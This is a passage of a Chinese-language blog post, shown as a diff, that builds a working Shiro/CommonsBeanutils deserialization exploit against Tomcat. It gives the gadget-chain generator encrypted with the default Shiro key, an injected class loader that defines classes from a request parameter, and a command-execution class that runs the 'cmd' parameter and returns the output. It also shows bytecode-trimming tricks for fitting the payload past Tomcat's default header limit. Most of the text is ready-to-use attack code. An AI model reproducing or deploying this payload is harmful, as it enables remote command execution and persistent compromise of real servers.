+        CtClass clazz = pool.get(EvilClassLoader.class.getName());
+        byte[] payloads = clazz.toBytecode();
+
+        byte[][] _bytecodes = new byte[][]&#123;payloads&#125;;
+        TemplatesImpl templates = new TemplatesImpl();
+        Field fieldBytecodes = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+        Field fieldName = templates.getClass().getDeclaredField(&quot;_name&quot;);
+        Field fieldTfactory = templates.getClass().getDeclaredField(&quot;_tfactory&quot;);
+        fieldBytecodes.setAccessible(true);
+        fieldName.setAccessible(true);
+        fieldTfactory.setAccessible(true);
+        fieldBytecodes.set(templates,_bytecodes);
+        fieldName.set(templates,&quot;aa&quot;);
+        fieldTfactory.set(templates,new TransformerFactoryImpl());
+
+//        PropertyUtils.getProperty(templates, &quot;outputProperties&quot;);
+
+        BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;,new AttrCompare());
+
+
+        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;();
+        priorityQueue.add(2);
+        priorityQueue.add(1);
+
+
+
+        Field fieldComparator = PriorityQueue.class.getDeclaredField(&quot;comparator&quot;);
+        fieldComparator.setAccessible(true);
+        fieldComparator.set(priorityQueue,beanComparator);
+
+        Field fieldQueue = PriorityQueue.class.getDeclaredField(&quot;queue&quot;);
+        fieldQueue.setAccessible(true);
+        fieldQueue.set(priorityQueue,new Object[]&#123;templates,1&#125;);
+        byte[] bytes = serialize(priorityQueue);
+
+        Base64.Encoder encoder = Base64.getEncoder();
+        String res = encoder.encodeToString(bytes);
+        System.out.println(res);
+
+
+        String base64Key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;;
+        byte[] keyBytes = Base64.getDecoder().decode(base64Key);
+
+        // 初始化向量IV，在Python中是随机生成的
+        byte[] ivBytes = new byte[16]; // 在实际应用中应随机生成
+        IvParameterSpec ivSpec = new IvParameterSpec(ivBytes);
+
+        // 加密的目标payload，这里用你提供的payload
+
+        try &#123;
+            // 创建AES加密器
+            Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);
+            SecretKeySpec keySpec = new SecretKeySpec(keyBytes, &quot;AES&quot;);
+            cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
+
+            // 解码payload并进行加密
+            byte[] payloadBytes = Base64.getDecoder().decode(res);
+            byte[] encryptedBytes = cipher.doFinal(payloadBytes);
+
+            // 将IV和加密后的数据拼接并进行Base64编码
+            byte[] ivAndEncrypted = new byte[ivBytes.length + encryptedBytes.length];
+            System.arraycopy(ivBytes, 0, ivAndEncrypted, 0, ivBytes.length);
+            System.arraycopy(encryptedBytes, 0, ivAndEncrypted, ivBytes.length, encryptedBytes.length);
+            String resultBase64 = Base64.getEncoder().encodeToString(ivAndEncrypted);
+            System.out.println(resultBase64);
+
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+    public static byte[] serialize(Object obj) throws IOException &#123;
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(obj);
+        return baos.toByteArray();
+    &#125;
+&#125;
+</code></pre>
+<p><code>EvilClassLoader.java</code> 打CB链加载的类 通过这个类从请求中加载字节码</p>
+<pre><code class="java">package com.arcueid;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.catalina.connector.Connector;
+import org.apache.catalina.connector.Response;
+import org.apache.catalina.core.ApplicationContext;
+import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.core.StandardService;
+import org.apache.catalina.loader.WebappClassLoaderBase;
+import org.apache.catalina.webresources.StandardRoot;
+import org.apache.coyote.Request;
+import org.apache.coyote.RequestGroupInfo;
+import org.apache.coyote.RequestInfo;
+import org.apache.coyote.http11.Http11NioProtocol;
+import org.apache.tomcat.util.net.AbstractEndpoint;
+
+
+import java.lang.reflect.Field;
+import java.util.ArrayList;
+
+
+public class EvilClassLoader extends AbstractTranslet &#123;
+    static&#123;
+        try &#123;
+            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+            StandardRoot stdRoot = (StandardRoot)getFiled(Class.forName(&quot;org.apache.catalina.loader.WebappClassLoaderBase&quot;),&quot;resources&quot;,webappClassLoaderBase);
+            StandardContext context = (StandardContext) stdRoot.getContext();
+            ApplicationContext applicationContext = (ApplicationContext) getFiled(Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;), &quot;context&quot;, context);
+            StandardService standardService = (StandardService)getFiled(Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;),&quot;service&quot;,applicationContext);
+            Connector[] connectors = (Connector[]) getFiled(Class.forName(&quot;org.apache.catalina.core.StandardService&quot;), &quot;connectors&quot;, standardService);
+            Http11NioProtocol protocolHandler = (Http11NioProtocol) getFiled(Class.forName(&quot;org.apache.catalina.connector.Connector&quot;),&quot;protocolHandler&quot;,connectors[0]);
+            AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) getFiled(Class.forName(&quot;org.apache.coyote.AbstractProtocol&quot;),&quot;handler&quot;,protocolHandler);
+            RequestGroupInfo requestGroupInfo = (RequestGroupInfo) getFiled(Class.forName(&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;),&quot;global&quot;,handler);
+            ArrayList&lt;RequestInfo&gt; arrayList = (ArrayList&lt;RequestInfo&gt;)getFiled(Class.forName(&quot;org.apache.coyote.RequestGroupInfo&quot;),&quot;processors&quot;,requestGroupInfo);
+
+
+
+            for (RequestInfo node:arrayList)&#123;
+
+                Request req = (Request) getFiled(Class.forName(&quot;org.apache.coyote.RequestInfo&quot;),&quot;req&quot;,node);
+                org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request)req.getNote(1);
+                Response response = request.getResponse();
+                String Code = request.getParameter(&quot;Code&quot;);
+
+                if (Code != null) &#123;
+                    byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(Code);
+                    //类加载器反射获取defineClass方法，这里调用的方法是defineClass(byte[] b, int off, int len)
+                    java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, new Class[]&#123;byte[].class, int.class, int.class&#125;);
+                    defineClassMethod.setAccessible(true);
+                    //defineClassMethod调用执行
+                    Class cc = (Class) defineClassMethod.invoke(EvilClassLoader.class.getClassLoader(), classBytes, 0, classBytes.length);
+                    //将执行结果传入到request、response、session三个对象
+                    cc.newInstance().equals(new Object[]&#123;request, response&#125;);
+                &#125;
+            &#125;
+
+        &#125;catch (Exception e)&#123;
+            throw new RuntimeException();
+        &#125;
+
+
+
+
+    &#125;
+
+    public static Object getFiled(Class clazz,String fieldName,Object obj) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
+        Field field = clazz.getDeclaredField(fieldName);
+        field.setAccessible(true);
+        return field.get(obj);
+    &#125;
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;
+
+    &#125;
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;
+
+    &#125;
+
+
+&#125;
+</code></pre>
+<p><code>CmdClass.java</code> 加载的恶意类</p>
+<pre><code class="java">package com.arcueid;
+
+import java.io.InputStream;
+import java.util.Scanner;
+
+public class CmdClass &#123;
+    public boolean equals(Object req) &#123;
+        Object[] context=(Object[]) req;
+        org.apache.catalina.connector.Request request=(org.apache.catalina.connector.Request)context[0];
+        org.apache.catalina.connector.Response response=(org.apache.catalina.connector.Response)context[1];
+        String cmd = request.getParameter(&quot;cmd&quot;);
+        if (cmd != null) &#123;
+            try &#123;
+                response.setContentType(&quot;text/html;charset=utf-8&quot;);
+                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
+                Scanner s = new Scanner(in).useDelimiter(&quot;\\\\a&quot;);
+                String output = s.hasNext() ? s.next() : &quot;&quot;;
+                response.getWriter().println(&quot;----------------------------------&quot;);
+                response.getWriter().println(output);
+                response.getWriter().println(&quot;----------------------------------&quot;);
+                response.getWriter().flush();
+                response.getWriter().close();
+            &#125; catch (Exception e) &#123;
+                e.printStackTrace();
+            &#125;
+        &#125;
+        return true;
+    &#125;
+&#125;
+</code></pre>
+<p><code>BytecodeReader.java</code> 生成字节码</p>
+<pre><code class="java">package com.arcueid;
+
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.io.ByteArrayOutputStream;
+import java.util.Base64;
+
+public class BytecodeReader &#123;
+
+    public static void main(String[] args) &#123;
+        String classFilePath = &quot;CmdClass.class&quot;;
+
+        try &#123;
+            FileInputStream fis = new FileInputStream(classFilePath);
+            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
+            byte[] data = new byte[1024];
+            int bytesRead;
+
+            while ((bytesRead = fis.read(data, 0, data.length)) != -1) &#123;
+                buffer.write(data, 0, bytesRead);
+            &#125;
+            buffer.flush();
+            byte[] bytecode = buffer.toByteArray();
+            fis.close();
+
+
+            String base64Bytecode = Base64.getEncoder().encodeToString(bytecode);
+
+            System.out.println(&quot;Base64 encoded bytecode of &quot; + classFilePath + &quot;:&quot;);
+            System.out.println(base64Bytecode);
+        &#125; catch (IOException e) &#123;
+            System.err.println(&quot;Error reading the class file: &quot; + e.getMessage());
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406171225999.png" alt="image-20240617122501061"></p>
+<p>现在的问题是Cookie依旧很大 因为获取request response用了很长的篇幅 一共8833个字符 这样实际上还是不通过tomcat默认的配置的</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14107">https://xz.aliyun.com/t/14107</a></p>
+<p>进一步的减少有如下三种方法</p>
+<pre><code>第一种，是通过减少payload本身字符串当中的一些内容，将涉及到字符串的部分都压缩到最少。
+第二种使用ASM删除LINENUMBER指令。
+</code></pre>
+<p>额外的 可以删除异常处理</p>
+<p>catch之后什么都不做</p>
+<p>8833 -&gt; 8705</p>
+<p><code>使用ASM删除LINENUMBER指令</code></p>
+<pre><code class="java">public static byte[] shortenClassBytes(byte[] classBytes) &#123;
+        ClassReader cr = new ClassReader(classBytes);
+        GenS.CustomClassWriter cw = new GenS.CustomClassWriter(ClassWriter.COMPUTE_FRAMES);
+        int api = Opcodes.ASM5;
+        ClassVisitor cv = new GenS.ShortClassVisitor(api, cw);
+        int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;
+        cr.accept(cv, parsingOptions);
+        byte[] out = cw.toByteArray();
+        return out;
+    &#125;
+
+    static class ShortClassVisitor extends ClassVisitor &#123;
+        private final int api;
+
+        public ShortClassVisitor(int api, ClassVisitor classVisitor) &#123;
+            super(api, classVisitor);
+            this.api = api;
+        &#125;
+
+        @Override
+        public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) &#123;
+            MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
+            return new ShortMethodAdapter(this.api, mv);
+        &#125;
+    &#125;
+
+    static class ShortMethodAdapter extends MethodVisitor implements Opcodes &#123;
+
+        public ShortMethodAdapter(int api, MethodVisitor methodVisitor) &#123;
+            super(api, methodVisitor);
+        &#125;
+
+        @Override
+        public void visitLineNumber(int line, Label start) &#123;
+            // delete line number
+        &#125;
+</code></pre>
+<p>8705 -&gt; 6425 </p>
+<p>在这里还可以删除两个实现的transform方法</p>
+<p>因为实际上这俩方法没用 只是不继承不通过编译</p>
+<pre><code class="java">        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(EvilClassLoader.class.getName());
+        CtMethod ctMethod = clazz.getDeclaredMethod(&quot;transform&quot;);
+        clazz.removeMethod(ctMethod);
+</code></pre>
+<p>6425 -&gt; 6209</p>
+<p>还能再删点没啥影响的请求头 </p>
+<p>至此通过默认配置</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406171322382.png" alt="image-20240617132225015"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202406171323790.png" alt="image-20240617132302641"></p>
+<pre><code class="java">package com.arcueid;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
+import jdk.internal.org.objectweb.asm.*;
+import org.apache.commons.beanutils.BeanComparator;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.PriorityQueue;
+
+public class Gen &#123;
+    public static void main(String []args) throws Exception &#123;
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(EvilClassLoader.class.getName());
+        CtMethod ctMethod = clazz.getDeclaredMethod(&quot;transform&quot;);
+        clazz.removeMethod(ctMethod);
+        byte[] payloads = clazz.toBytecode();
+
+
+        byte[] out = shortenClassBytes(payloads);
+
+
+        byte[][] _bytecodes = new byte[][]&#123;out&#125;;
+        TemplatesImpl templates = new TemplatesImpl();
+        Field fieldBytecodes = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+        Field fieldName = templates.getClass().getDeclaredField(&quot;_name&quot;);
+        Field fieldTfactory = templates.getClass().getDeclaredField(&quot;_tfactory&quot;);
+        fieldBytecodes.setAccessible(true);
+        fieldName.setAccessible(true);
+        fieldTfactory.setAccessible(true);
+        fieldBytecodes.set(templates,_bytecodes);
+        fieldName.set(templates,&quot;1&quot;);
+        //fieldTfactory.set(templates,new TransformerFactoryImpl());
+
+//        PropertyUtils.getProperty(templates, &quot;outputProperties&quot;);
+
+        BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;,new AttrCompare());
+
+
+        PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;();
+        priorityQueue.add(2);
+        priorityQueue.add(1);
+
+
+
+        Field fieldComparator = PriorityQueue.class.getDeclaredField(&quot;comparator&quot;);
+        fieldComparator.setAccessible(true);
+        fieldComparator.set(priorityQueue,beanComparator);
+
+        Field fieldQueue = PriorityQueue.class.getDeclaredField(&quot;queue&quot;);
+        fieldQueue.setAccessible(true);
+        fieldQueue.set(priorityQueue,new Object[]&#123;templates,1&#125;);
+        byte[] bytes = serialize(priorityQueue);
+
+        Base64.Encoder encoder = Base64.getEncoder();
+        String res = encoder.encodeToString(bytes);
+        System.out.println(res);
+
+
+        String base64Key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;;
+        byte[] keyBytes = Base64.getDecoder().decode(base64Key);
+
+        // 初始化向量IV，在Python中是随机生成的
+        byte[] ivBytes = new byte[16]; // 在实际应用中应随机生成
+        IvParameterSpec ivSpec = new IvParameterSpec(ivBytes);
+
+        // 加密的目标payload，这里用你提供的payload
+
+        try &#123;
+            // 创建AES加密器
+            Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);
+            SecretKeySpec keySpec = new SecretKeySpec(keyBytes, &quot;AES&quot;);
+            cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
+
+            // 解码payload并进行加密
+            byte[] payloadBytes = Base64.getDecoder().decode(res);
+            byte[] encryptedBytes = cipher.doFinal(payloadBytes);
+
+            // 将IV和加密后的数据拼接并进行Base64编码
+            byte[] ivAndEncrypted = new byte[ivBytes.length + encryptedBytes.length];
+            System.arraycopy(ivBytes, 0, ivAndEncrypted, 0, ivBytes.length);
+            System.arraycopy(encryptedBytes, 0, ivAndEncrypted, ivBytes.length, encryptedBytes.length);
+            String resultBase64 = Base64.getEncoder().encodeToString(ivAndEncrypted);
+            System.out.println(resultBase64);
+
+        &#125; catch (Exception ignored) &#123;
+        &#125;
+    &#125;
+    public static byte[] serialize(Object obj) throws IOException &#123;
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(obj);
+        return baos.toByteArray();
+    &#125;
+
+
+    public static byte[] shortenClassBytes(byte[] classBytes) &#123;
+        ClassReader cr = new ClassReader(classBytes);
+        GenS.CustomClassWriter cw = new GenS.CustomClassWriter(ClassWriter.COMPUTE_FRAMES);
+        int api = Opcodes.ASM5;
+        ClassVisitor cv = new GenS.ShortClassVisitor(api, cw);
+        int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;
+        cr.accept(cv, parsingOptions);
+        byte[] out = cw.toByteArray();
+        return out;
+    &#125;
+
+    static class ShortClassVisitor extends ClassVisitor &#123;
+        private final int api;
+
+        public ShortClassVisitor(int api, ClassVisitor classVisitor) &#123;
+            super(api, classVisitor);
+            this.api = api;
+        &#125;
+
+        @Override
+        public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) &#123;
+            MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
+            return new ShortMethodAdapter(this.api, mv);
+        &#125;
+    &#125;
+
+    static class ShortMethodAdapter extends MethodVisitor implements Opcodes &#123;
+
+        public ShortMethodAdapter(int api, MethodVisitor methodVisitor) &#123;
+            super(api, methodVisitor);
+        &#125;
+
+        @Override
+        public void visitLineNumber(int line, Label start) &#123;
+            // delete line number
+        &#125;
+    &#125;
+
+    static class CustomClassWriter extends ClassWriter &#123;
+        public CustomClassWriter(int flags) &#123;
+            super(flags);
+        &#125;
+
+        @Override
+        protected String getCommonSuperClass(String type1, String type2) &#123;
+            // Return the Object class as the common superclass to avoid loading classes
+            return &quot;java/lang/Object&quot;;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
